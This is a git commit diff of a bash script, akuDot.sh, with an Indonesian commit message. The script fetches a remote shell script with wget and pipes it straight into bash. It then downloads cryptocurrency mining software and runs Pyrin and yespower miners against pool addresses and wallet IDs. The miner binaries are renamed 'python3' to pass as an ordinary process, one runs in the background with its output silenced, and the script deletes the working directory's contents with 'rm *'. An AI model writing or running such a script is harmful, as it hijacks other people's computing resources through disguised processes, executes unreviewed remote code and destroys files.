241797433bb17a573591f47c365cf160ea97160b
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-18 02:45:16 +0700

    created hendi kusnandi

--- akuDot.sh
+++ akuDot.sh
@@ -1,29 +1,23 @@
 #!/bin/bash
 
+apt install screen -y
+
 bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotLol.sh)"
-
-sleep 5
-
-bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotSrb.sh)"
-
-sleep 5
-
-clear
-
-echo "menjalankan dotlol..."
 
 nohup ./dotlol/python3 -a PYRIN --pool kr.pyrin.herominers.com:1177 --user pyrin:qq5fnz6aelfdruhshjpul598fxyeqfkjh86cvypt2902mghd0ql7gy7g799ff.DOT --no-cl > /dev/null 2>&1 &
 
-sleep 5
+wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
 
-clear
+tar -xzf dot
 
-echo "menjalankan dotsrb..."
+rm dot
 
-nohup ./dotsrb/python3 -a yespower -o stratum-asia.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOTnyolo -p m=solo > /dev/null 2>&1 &
+mv cpuminer-sse2 python3
 
-sleep 5
+mv python3 ~/
 
-clear
+rm *
 
-echo "berjalan semuanya..."
+cd ~/
+
+screen ./python3 -a yespower -o stratum-eu.rplant.xyz:7122 -u QdeLX9ToumSqAfryzmfxJv366NtwStVimq.DOT
